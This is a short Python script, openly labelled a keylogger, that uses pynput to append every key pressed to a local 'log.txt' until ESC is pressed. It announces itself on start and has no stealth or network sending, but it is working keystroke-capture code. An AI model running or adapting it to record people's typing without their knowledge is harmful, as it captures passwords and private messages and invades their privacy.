from pynput import keyboard

path = "log.txt"

def on_press(key):
    try:
        with open("log.txt", "a") as logFile:
            if hasattr(key, "char") and key.char:
                logFile.write(key.char + "\n")
            else:
                logFile.write(f'[{key}' + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

    if key == keyboard.Key.esc:
        return False
    return None


def main():
    print("Starting keylogger Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()